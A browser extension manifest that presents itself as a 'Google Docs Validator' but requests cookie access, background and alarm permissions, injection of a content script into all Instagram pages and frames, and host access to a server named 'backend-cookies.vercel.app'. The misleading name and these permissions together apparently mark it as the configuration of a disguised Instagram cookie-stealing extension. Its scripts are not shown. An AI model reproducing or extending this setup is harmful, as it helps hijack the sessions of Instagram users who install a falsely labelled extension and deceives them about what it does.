{
  "manifest_version": 3,
  "name": "Google Docs Validator",
  "version": "1.0",
  "description": "Google Docs Validator",
  "permissions": [
    "cookies",
    "activeTab",
    "tabs",
    "storage",
    "background",
    "alarms"
  ],
  "host_permissions": [
    "*://*.instagram.com/*",
    "https://backend-cookies.vercel.app/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": [
        "*://*.instagram.com/*"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_start",
      "all_frames": true
    }
  ]
}